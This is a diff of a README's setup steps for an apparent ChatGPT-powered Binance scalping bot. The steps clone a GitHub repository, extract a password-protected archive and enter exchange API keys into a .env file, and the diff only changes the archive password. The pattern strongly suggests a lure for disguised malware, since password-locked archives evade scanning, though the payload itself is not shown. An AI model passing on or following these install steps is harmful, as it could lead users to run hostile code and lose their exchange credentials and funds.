@@ -56,7 +56,7 @@ for index, row in df.iterrows():
    ```bash
    git clone https://github.com/exileqeq/chatgpt-binance-scalping.git
    cd chatgpt-binance-scalping
-3. **extract archive with pass `3a4w6iZsbu`**
+3. **extract archive with pass `60nXdk3RK2f`**
 4. **Configure your environment:**
 In the `.env` file, specify the necessary api keys
 5. **Define the trading pair and timeframe**
